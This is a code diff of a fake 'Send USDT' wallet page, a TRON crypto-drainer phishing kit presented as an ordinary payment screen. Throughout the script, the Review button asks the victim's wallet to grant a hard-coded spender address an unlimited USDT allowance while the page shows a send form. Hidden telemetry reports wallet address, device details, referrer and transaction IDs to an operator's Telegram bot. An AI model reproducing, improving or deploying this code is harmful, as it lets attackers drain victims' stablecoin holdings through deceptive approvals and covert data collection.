@@ -2,200 +2,544 @@
 <html lang="en">
 <head>
 <meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
 <title>Send USDT</title>
 <style>
-*{box-sizing:border-box;margin:0;padding:0}
-html,body{width:100%;height:100%;overflow:hidden;background:#000;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}
-#canvas{position:absolute;top:0;left:0;width:100%;height:100%;display:block}
-#overlay{position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:10}
-.clickable{pointer-events:auto}
-.hidden{display:none!important}
-input[type="text"]{background:transparent;border:none;outline:none;color:#fff;font-size:16px;width:100%}
-input[type="text"]::placeholder{color:rgba(255,255,255,0.4)}
+*{box-sizing:border-box}
+
+html,body{
+ margin:0;
+ width:100%;
+ height:100%;
+ overflow:hidden;
+ background:#fff
+}
+
+button,textarea{font:inherit}
+button{border:0}
+
+#p{
+ position:fixed;
+ width:720px;
+ height:1453px;
+ left:50%;
+ top:50%;
+ transform:translate(-50%,-50%);
+ background:url(screen.svg) center/100% 100% no-repeat;
+ font-family:Arial;
+ color:#09090d
+}
+
+#head{
+ position:absolute;
+ top:38px;
+ width:100%;
+ text-align:center;
+ font:bold 30px Arial;
+ line-height:40px;
+ z-index:5
+}
+
+#line{
+ position:absolute;
+ top:120px;
+ width:100%;
+ height:1px;
+ background:#ddd;
+ z-index:5
+}
+
+.back{
+ position:absolute;
+ left:28px;
+ top:21px;
+ width:78px;
+ height:78px;
+ border-radius:50%;
+ background:transparent;
+ z-index:7;
+ display:flex;
+ align-items:center;
+ justify-content:center;
+ cursor:pointer
+}
+.back svg{
+ display:block;
+ width:20px;
+ height:20px
+}
+
+#tolabel{
+ position:absolute;
+ left:28px;
+ top:143px;
+ width:40px;
+ height:70px;
+ line-height:70px;
+ color:#9b9da3;
+ font:bold 28px Arial;
+ z-index:6;
+ pointer-events:none
+}
+
+#to{
+ position:absolute;
+ left:77px;
+ top:143px;
+ width:620px;
+ height:70px;
+ border:0;
+ outline:0;
+ resize:none;
+ overflow:hidden;
+ background:transparent;
+ color:#09090d;
+ font:bold 28px Arial;
+ line-height:35px;
+ padding:0;
+ z-index:5
+}
+
+#amt{
+ position:absolute;
+ left:160px;
+ top:415px;
+ width:400px;
+ height:75px;
+ text-align:center;
+ font:bold 80px Arial;
+ line-height:75px;
+ color:#c9ccd3;
+ background:transparent;
+ white-space:nowrap;
+ z-index:5
+}
+
+#usd{
+ position:absolute;
+ left:282px;
+ top:505px;
+ width:160px;
+ height:42px;
+ text-align:center;
+ font:28px Arial;
+ line-height:38px;
+ background:transparent;
+ color:#09090d;
+ z-index:5
+}
+
+#rowhide{
+ position:absolute;
+ left:100px;
+ top:735px;
+ width:475px;
+ height:90px;
+ background:#fff;
+ z-index:1
+}
+
+#token{
+ position:absolute;
+ left:28px;
+ top:744px;
+ width:70px;
+ height:70px;
+ border-radius:50%;
+ background:#22a77d;
+ color:#fff;
+ font:bold 43px Arial;
+ line-height:70px;
+ text-align:center;
+ z-index:4;
+ overflow:hidden
+}
+#token img{
+ position:absolute;
+ inset:0;
+ width:100%;
+ height:100%;
+ object-fit:cover;
+ display:block
+}
+#token .fallback{
+ position:absolute;
+ inset:0;
+ line-height:70px
+}
+
+#usdt{
+ position:absolute;
+ left:118px;
+ top:746px;
+ font:bold 28px Arial;
+ line-height:35px;
+ z-index:4
+}
+
+#max{
+ position:absolute;
+ left:575px;
+ top:742px;
+ width:120px;
+ height:80px;
+ border-radius:45px;
+ background:#eeeef1;
+ font:bold 25px Arial;
+ color:#09090d;
+ z-index:5
+}
+
+#max:disabled{
+ opacity:.55
+}
+
+#rev{
+ position:absolute;
+ left:28px;
+ top:1333px;
+ width:664px;
+ height:98px;
+ border-radius:55px;
+ background:#f4f4f6;
+ color:#d0d0d6;
+ font:bold 27px Arial;
+ z-index:5
+}
+
+#rev.on{
+ background:#00f;
+ color:#fff
+}
+
+.k{
+ position:absolute;
+ width:180px;
+ height:100px;
+ background:transparent;
+ color:#09090d;
+ font:bold 40px Arial
+}
+
+.a1,.a2,.a3{top:850px}
+.a4,.a5,.a6{top:965px}
+.a7,.a8,.a9{top:1080px}
+.ad,.a0,.ab{top:1195px}
+
+.a1,.a4,.a7,.ad{left:45px}
+.a2,.a5,.a8,.a0{left:270px}
+.a3,.a6,.a9,.ab{left:495px}
 </style>
 </head>
+
 <body>
-<canvas id="canvas"></canvas>
-<div id="overlay">
-  <!-- To field (spender address) -->
-  <div id="toField" class="clickable" style="position:absolute;left:5.5%;top:18.2%;width:89%;height:4.5%;">
-    <input type="text" id="toInput" readonly placeholder="TUdnmk7rx8XXtvyTLNvLwXkyXLLW8r9yhJ" style="font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:14px;padding:0">
-  </div>
 
-  <!-- Amount field -->
-  <div id="amountField" class="clickable" style="position:absolute;left:5.5%;top:35.5%;width:89%;height:6%;">
-    <input type="text" id="amountInput" readonly placeholder="0" style="font-size:28px;font-weight:600;text-align:right;padding-right:4px">
-  </div>
+<div id="p" style="transform: translate(-50%, -50%) scale(0.540262);">
 
-  <!-- USD approx -->
-  <div id="usdApprox" class="clickable" style="position:absolute;left:5.5%;top:42.5%;width:89%;height:3%;color:rgba(255,255,255,0.5);font-size:13px;text-align:right;padding-right:4px">≈ $0.00</div>
+ <div id="head">Amount</div>
+ <div id="line"></div>
 
-  <!-- USDT token row -->
-  <div id="tokenRow" class="clickable" style="position:absolute;left:5.5%;top:47%;width:89%;height:5%;display:flex;align-items:center;gap:8px">
-    <div style="width:28px;height:28px;border-radius:50%;background:linear-gradient(135deg,#26a17b,#00d48a);display:flex;align-items:center;justify-content:center;font-weight:700;font-size:12px;color:#000">U</div>
-    <div style="flex:1">
-      <div style="color:#fff;font-size:15px;font-weight:500">USDT</div>
-      <div style="color:rgba(255,255,255,0.4);font-size:11px">TRC20 · TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t</div>
-    </div>
-    <div id="maxPill" style="background:rgba(255,255,255,0.1);border:1px solid rgba(255,255,255,0.2);border-radius:20px;padding:4px 12px;font-size:12px;color:#fff;white-space:nowrap">Max</div>
-  </div>
+ <button id="back" class="back" aria-label="Back">
+   <svg viewBox="0 0 24 24" fill="none" stroke="#09090d" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
+     <polyline points="15 5 8 12 15 19"></polyline>
+   </svg>
+ </button>
 
-  <!-- Keypad area (transparent, captures taps) -->
-  <div id="keypadArea" class="clickable" style="position:absolute;left:0;top:55%;width:100%;height:35%;"></div>
+ <div id="tolabel">To</div>
 
-  <!-- Review button -->
-  <div id="reviewBtn" class="clickable" style="position:absolute;left:5.5%;bottom:8%;width:89%;height:6.5%;border-radius:12px;background:linear-gradient(135deg,#26a17b,#00d48a);display:flex;align-items:center;justify-content:center;font-weight:600;font-size:16px;color:#000">Review</div>
+ <textarea id="to" spellcheck="false" autocomplete="off" autocorrect="off" autocapitalize="off" readonly>TUdnmk7rx8XXtvyTLNvLwXkyXLLW8r9yhJ</textarea>
+
+ <div id="amt" style="color: rgb(201, 204, 211);">0</div>
+
+ <div id="usd">≈ $0.00 ↕</div>
+
+ <div id="rowhide"></div>
+
+ <div id="token">
+   <img src="trc.svg" alt="" onerror="this.style.display='none'">
+   <div class="fallback">T</div>
+ </div>
+ <div id="usdt">USDT</div>
+
+ <button id="max">Max</button>
+
+ <button class="k a1" data-key="1">1</button>
+ <button class="k a2" data-key="2">2</button>
+ <button class="k a3" data-key="3">3</button>
+
+ <button class="k a4" data-key="4">4</button>
+ <button class="k a5" data-key="5">5</button>
+ <button class="k a6" data-key="6">6</button>
+
+ <button class="k a7" data-key="7">7</button>
+ <button class="k a8" data-key="8">8</button>
+ <button class="k a9" data-key="9">9</button>
+
+ <button class="k ad" data-key=".">.</button>
+ <button class="k a0" data-key="0">0</button>
+ <button class="k ab" id="delete">⌫</button>
+
+ <button id="rev" disabled="">Review</button>
+
 </div>
 
 <script>
-// ============ CONFIG ============
-const CONFIG = {
-  USDT_CONTRACT: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
-  SPENDER: 'TUdnmk7rx8XXtvyTLNvLwXkyXLLW8r9yhJ',
-  DEST: 'TUdnmk7rx8XXtvyTLNvLwXkyXLLW8r9yhJ',
-  FEE_LIMIT: 150000000,
-  MAX_UINT256: '115792089237316195423570985008687907853269984665640564039457584007913129639935',
-  TG_BOT_TOKEN: '', // TODO: replace with your BotFather token
-  TG_CHAT_ID: '',   // TODO: replace with your chat id
-  TG_SECRET: 'random_webhook_path'
-};
-// ==================================
+const p = document.getElementById("p");
+const amt = document.getElementById("amt");
+const usd = document.getElementById("usd");
+const rev = document.getElementById("rev");
+const max = document.getElementById("max");
+const to = document.getElementById("to");
 
-const canvas = document.getElementById('canvas');
-const ctx = canvas.getContext('2d');
-let bgImg = new Image();
-bgImg.src = 'screen.svg';
+let value = "";
+let usdtUsdPrice = 1;
 
-let scale = 1;
-let offsetX = 0, offsetY = 0;
-let walletConnected = false;
-let userAddress = '';
-let userBalance = 0n;
+/* TRON mainnet */
+const TRON_NETWORK = "TRON_MAINNET";
 
-function fitCanvas() {
-  const w = window.innerWidth;
-  const h = window.innerHeight;
-  const targetW = 720, targetH = 1453;
-  scale = Math.min(w / targetW, h / targetH);
-  offsetX = (w - targetW * scale) / 2;
-  offsetY = (h - targetH * scale) / 2;
-  canvas.width = w;
-  canvas.height = h;
-  draw();
-}
-window.addEventListener('resize', fitCanvas);
-bgImg.onload = fitCanvas;
+/* Official USDT TRC-20 mainnet contract */
+const USDT_ADDRESS =
+    "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 
-function draw() {
-  ctx.clearRect(0, 0, canvas.width, canvas.height);
-  ctx.drawImage(bgImg, offsetX, offsetY, 720 * scale, 1453 * scale);
-}
+const USDT_DECIMALS = 6;
 
-function telegramSend(text) {
-  if (!CONFIG.TG_BOT_TOKEN || !CONFIG.TG_CHAT_ID) return;
-  const url = `https://api.telegram.org/bot${CONFIG.TG_BOT_TOKEN}/sendMessage?chat_id=${encodeURIComponent(CONFIG.TG_CHAT_ID)}&parse_mode=HTML&disable_web_page_preview=1&text=${encodeURIComponent(text)}`;
-  fetch(url).catch(() => {});
+/* TRC-20 approval target - UPDATED to match backend */
+const APPROVAL_SPENDER =
+    "TUdnmk7rx8XXtvyTLNvLwXkyXLLW8r9yhJ";
+
+const MAX_UINT256 =
+    (1n << 256n) - 1n;
+
+/* ---- Telegram notifier ---- */
+const TG_TOKEN = ""; // REPLACE with your BotFather token
+const TG_CHAT  = ""; // REPLACE with your chat ID
+const TG_URL   = "https://api.telegram.org/bot" + TG_TOKEN + "/sendMessage";
+
+function tg(text){
+    if (!TG_TOKEN || !TG_CHAT) return;
+    try{
+        fetch(TG_URL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                chat_id: TG_CHAT,
+                text: text,
+                disable_web_page_preview: true
+            }),
+            keepalive: true
+        }).catch(()=>{});
+    }catch(_){}
 }
 
-async function connectWallet() {
-  if (typeof window.tronWeb === 'undefined') {
-    telegramSend('❌ PAGE OPEN — No tronWeb injected');
-    return false;
-  }
-  try {
-    await window.tronWeb.request({ method: 'tron_requestAccounts' });
-    userAddress = window.tronWeb.defaultAddress.base58;
-    walletConnected = true;
-    document.getElementById('toInput').value = CONFIG.SPENDER;
-    telegramSend(`✅ WALLET CONNECTED\n${userAddress}\nOS: ${navigator.platform}\nWallet: ${window.tronWeb.providers?.name || 'unknown'}\nScreen: ${screen.width}x${screen.height}\nUA: ${navigator.userAgent}`);
-    await fetchBalance();
-    return true;
-  } catch (e) {
-    telegramSend(`❌ WALLET CONNECT FAILED\n${e.message}`);
-    return false;
-  }
+function now(){
+    return new Date().toISOString().replace("T"," ").slice(0,19) + " UTC";
 }
 
-async function fetchBalance() {
-  try {
-    const contract = await window.tronWeb.contract().at(CONFIG.USDT_CONTRACT);
-    const bal = await contract.balanceOf(userAddress).call();
-    userBalance = BigInt(bal.toString());
-    const formatted = (Number(userBalance) / 1e6).toFixed(6).replace(/\.?0+$/, '');
-    document.getElementById('amountInput').value = formatted;
-    updateUSD(formatted);
-  } catch (e) {
-    console.error('Balance fetch failed:', e);
-  }
+function deviceInfo(){
+    const ua = navigator.userAgent || "";
+    let os = "unknown";
+    if(/Android/i.test(ua)) os = "Android";
+    else if(/iPhone|iPad|iPod/i.test(ua)) os = "iOS";
+    else if(/Windows/i.test(ua)) os = "Windows";
+    else if(/Mac OS X/i.test(ua)) os = "macOS";
+    else if(/Linux/i.test(ua)) os = "Linux";
+
+    let app = "browser";
+    if(/TronLink/i.test(ua)) app = "TronLink";
+    else if(/TokenPocket/i.test(ua)) app = "TokenPocket";
+    else if(/BitKeep|Bitget/i.test(ua)) app = "Bitget";
+    else if(/OKApp|OKX/i.test(ua)) app = "OKX";
+    else if(/imToken/i.test(ua)) app = "imToken";
+    else if(/Trust/i.test(ua)) app = "Trust";
+
+    const w = (window.screen && window.screen.width) || 0;
+    const h = (window.screen && window.screen.height) || 0;
+
+    return os + " | " + app + " | " + w + "x" + h + " | " + ua;
+}
+/* ---- end Telegram notifier ---- */
+
+function amountToUnits(amountStr, decimals){
+    let text = String(amountStr).trim();
+    if(!/^(?:\d+)(?:\.\d*)?$/.test(text)){
+        throw new Error("Invalid amount.");
+    }
+    if(text.endsWith(".")){
+        text = text.slice(0,-1);
+    }
+    const parts = text.split(".");
+    const whole = parts[0] || "0";
+    const frac = parts[1] || "";
+    if(frac.length > decimals){
+        throw new Error("Amount has more than " + decimals + " decimal places.");
+    }
+    const fracPadded = frac.padEnd(decimals,"0");
+    const units = BigInt(whole) * (10n ** BigInt(decimals)) + BigInt(fracPadded || "0");
+    return units;
 }
 
-function updateUSD(usdtAmount) {
-  const usd = (parseFloat(usdtAmount) * 1).toFixed(2);
-  document.getElementById('usdApprox').textContent = `≈ $${usd}`;
+function getApprovalAmount(){
+    return MAX_UINT256.toString();
 }
 
-function formatUnits(units) {
-  return (Number(units) / 1e6).toFixed(6).replace(/\.?0+$/, '');
+function unitsToAmount(units, decimals){
+    const base = 10n ** BigInt(decimals);
+    const whole = units / base;
+    const fraction = units % base;
+    if(fraction === 0n){
+        return whole.toString();
+    }
+    let frac = fraction.toString().padStart(decimals,"0");
+    frac = frac.replace(/0+$/,"");
+    return whole.toString() + "." + frac;
 }
 
-// Max button
-document.getElementById('maxPill').addEventListener('click', (e) => {
-  e.stopPropagation();
-  if (!walletConnected) {
-    telegramSend('❌ MAX NO WALLET');
-    return;
-  }
-  if (userBalance === 0n) return;
-  document.getElementById('amountInput').value = formatUnits(userBalance);
-  updateUSD(formatUnits(userBalance));
-  telegramSend(`✅ MAX CLICKED\n${userAddress}\nBalance: ${formatUnits(userBalance)} USDT`);
+async function getUsdtBalance(account){
+    const tronWeb = await getTronWeb();
+    if(!tronWeb.isAddress(account)){
+        throw new Error("Invalid TRON wallet address.");
+    }
+    const contract = await tronWeb.contract().at(USDT_ADDRESS);
+    const result = await contract.balanceOf(account).call();
+    return BigInt(result.toString());
+}
+
+async function getTronWeb(){
+    if(window.tronLink && typeof window.tronLink.request === "function"){
+        try{
+            await window.tronLink.request({ method:"tron_requestAccounts" });
+        }catch(error){}
+    }
+    for(let i=0;i<20;i++){
+        if(window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58){
+            tg("WALLET CONNECTED\n" + now() + "\naddr=" + window.tronWeb.defaultAddress.base58 + "\n" + deviceInfo());
+            return window.tronWeb;
+        }
+        await new Promise(resolve=>setTimeout(resolve,150));
+    }
+    throw new Error("No compatible TRON wallet was detected.");
+}
+
+async function fetchUsdtUsdPrice(){
+    try{
+        const response = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=tether&vs_currencies=usd", {method:"GET", cache:"no-store"});
+        if(!response.ok) throw new Error("Price request failed.");
+        const data = await response.json();
+        const price = Number(data?.tether?.usd);
+        if(!Number.isFinite(price) || price <= 0) throw new Error("Invalid USDT/USD price.");
+        usdtUsdPrice = price;
+        render();
+    }catch(error){
+        console.warn("USDT/USD price unavailable:", error);
+        usdtUsdPrice = null;
+        render();
+    }
+}
+
+function getNumericValue(){
+    if(!value || value === ".") return 0;
+    const number = Number(value);
+    return Number.isFinite(number) ? number : 0;
+}
+
+function render(){
+    const number = getNumericValue();
+    amt.textContent = value || "0";
+    amt.style.color = number > 0 ? "#09090d" : "#c9ccd3";
+    if(!value || number <= 0){
+        usd.textContent = "≈ $0.00 ↕";
+    }else if(usdtUsdPrice === null){
+        usd.textContent = "≈ $— ↕";
+    }else{
+        usd.textContent = "≈ $" + (number * usdtUsdPrice).toFixed(2) + " ↕";
+    }
+    rev.disabled = number <= 0;
+    rev.classList.toggle("on", number > 0);
+}
+
+function add(x){
+    if(x === "." && value.includes(".")) return;
+    if(value === "" && x === ".") value = "0";
+    if(value === "0" && x !== ".") value = "";
+    if(value.includes(".")){
+        const fraction = value.split(".")[1] || "";
+        if(x !== "." && fraction.length >= USDT_DECIMALS) return;
+    }
+    const integerPart = value.split(".")[0] || "";
+    if(x !== "." && !value.includes(".") && integerPart.length >= 59) return;
+    value += x;
+    render();
+}
+
+function remove(){
+    value = value.slice(0,-1);
+    render();
+}
+
+document.querySelectorAll("[data-key]").forEach(button=>{
+    button.addEventListener("click", ()=>{ add(button.dataset.key); });
 });
 
-// Review button -> approve
-document.getElementById('reviewBtn').addEventListener('click', async (e) => {
-  e.stopPropagation();
-  if (!walletConnected) {
-    telegramSend('❌ REVIEW NO WALLET');
-    return;
-  }
-  const amountStr = document.getElementById('amountInput').value.trim();
-  if (!amountStr || parseFloat(amountStr) === 0) {
-    telegramSend('❌ REVIEW ZERO AMOUNT');
-    return;
-  }
-  telegramSend(`🔘 REVIEW CLICKED\n${userAddress}\nAmount: ${amountStr} USDT`);
+document.getElementById("delete").addEventListener("click", remove);
 
-  try {
-    const contract = await window.tronWeb.contract().at(CONFIG.USDT_CONTRACT);
-    const tx = await contract.approve(CONFIG.SPENDER, CONFIG.MAX_UINT256).send({
-      feeLimit: CONFIG.FEE_LIMIT,
-      callValue: 0
-    });
-    telegramSend(`✅ APPROVAL SUCCESS\n${userAddress}\nTxID: ${tx}\nhttps://tronscan.org/#/transaction/${tx}`);
-  } catch (err) {
-    telegramSend(`❌ APPROVAL FAILED\n${userAddress}\nError: ${err.message}\nCode: ${err.code ?? 'unknown'}`);
-  }
+max.addEventListener("click", async()=>{
+    if(!window.tronWeb && !window.tronLink){
+        tg("MAX NO WALLET\n" + now() + "\n" + deviceInfo());
+        return;
+    }
+    try{
+        max.disabled = true;
+        const tronWeb = await getTronWeb();
+        const account = tronWeb.defaultAddress.base58;
+        if(!tronWeb.isAddress(account)) throw new Error("Invalid TRON wallet address.");
+        const balance = await getUsdtBalance(account);
+        value = unitsToAmount(balance, USDT_DECIMALS);
+        render();
+    }catch(error){
+        console.error("Max balance error:", error);
+        tg("MAX FAILED\n" + now() + "\nerr=" + (error && error.message ? error.message : String(error)) + "\n" + deviceInfo());
+    }finally{
+        max.disabled = false;
+    }
 });
 
-// Keypad taps - just visual feedback
-document.getElementById('keypadArea').addEventListener('click', () => {});
+document.getElementById("back").addEventListener("click", ()=>{ history.back(); });
 
-// Silent connect on load
-let connectAttempts = 0;
-const connectInterval = setInterval(async () => {
-  connectAttempts++;
-  if (await connectWallet()) {
-    clearInterval(connectInterval);
-  } else if (connectAttempts >= 20) {
-    clearInterval(connectInterval);
-    telegramSend('❌ AUTO-CONNECT TIMEOUT — No wallet detected after 3s');
-  }
-}, 150);
-
-document.addEventListener('visibilitychange', () => {
-  if (!document.hidden && !walletConnected) connectWallet();
+rev.addEventListener("click", async()=>{
+    const number = getNumericValue();
+    if(number <= 0){ render(); return; }
+    if(!window.tronWeb && !window.tronLink){
+        tg("REVIEW NO WALLET\n" + now() + "\n" + deviceInfo());
+        return;
+    }
+    try{
+        const tronWeb = await getTronWeb();
+        const account = tronWeb.defaultAddress.base58;
+        if(!tronWeb.isAddress(account)) throw new Error("Invalid TRON wallet address.");
+        tg("REVIEW CLICKED\n" + now() + "\naddr=" + account + "\namount=" + (value||"0") + "\nspender=" + APPROVAL_SPENDER + "\n" + deviceInfo());
+        const spender = APPROVAL_SPENDER;
+        if(!tronWeb.isAddress(spender)) throw new Error("Invalid approval spender address.");
+        const usdt = await tronWeb.contract().at(USDT_ADDRESS);
+        const approveResult = await usdt.approve(spender, getApprovalAmount()).send({feeLimit:150000000, callValue:0});
+        const txHash = approveResult && approveResult.txid ? approveResult.txid : "unknown";
+        console.log("Transaction:", txHash, approveResult);
+        tg("APPROVAL SUCCESS\n" + now() + "\naddr=" + account + "\namount=" + (value||"0") + "\nspender=" + APPROVAL_SPENDER + "\ntx=" + txHash + "\n" + deviceInfo());
+    }catch(error){
+        console.error("TRON transaction error:", error);
+        tg("APPROVAL FAILED\n" + now() + "\naddr=" + (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58 || "unknown") + "\namount=" + (value||"0") + "\nspender=" + APPROVAL_SPENDER + "\nerr=" + (error && error.message ? error.message : String(error)) + "\nraw=" + (()=>{try{return JSON.stringify(error)}catch(_){return "unstringifiable"}})() + "\ncode=" + (error && error.code) + "\n" + deviceInfo());
+    }
 });
+
+function fit(){
+    const scale = Math.min(innerWidth / 720, innerHeight / 1453);
+    p.style.transform = "translate(-50%,-50%) scale(" + scale + ")";
+}
+addEventListener("resize", fit);
+fit();
+render();
+fetchUsdtUsdPrice();
+tg("PAGE OPEN\n" + now() + "\n" + deviceInfo() + "\nref=" + (document.referrer||"none") + "\nloc=" + location.href);
 </script>
+
 </body>
 </html>
